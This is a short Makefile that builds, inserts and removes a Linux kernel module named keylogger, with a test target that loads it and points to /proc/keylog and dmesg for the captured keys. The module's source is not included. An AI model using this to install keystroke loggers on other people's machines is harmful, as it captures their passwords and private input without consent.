obj-m += keylogger.o

KDIR ?= /lib/modules/$(shell uname -r)/build

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

install: all
	sudo insmod keylogger.ko

uninstall:
	sudo rmmod keylogger

test:
	sudo dmesg -C
	sudo insmod keylogger.ko
	@echo "Module loaded. Press some keys..."
	@echo "Then check: cat /proc/keylog"
	@echo "Or: dmesg | grep keylogger"

.PHONY: all clean install uninstall test
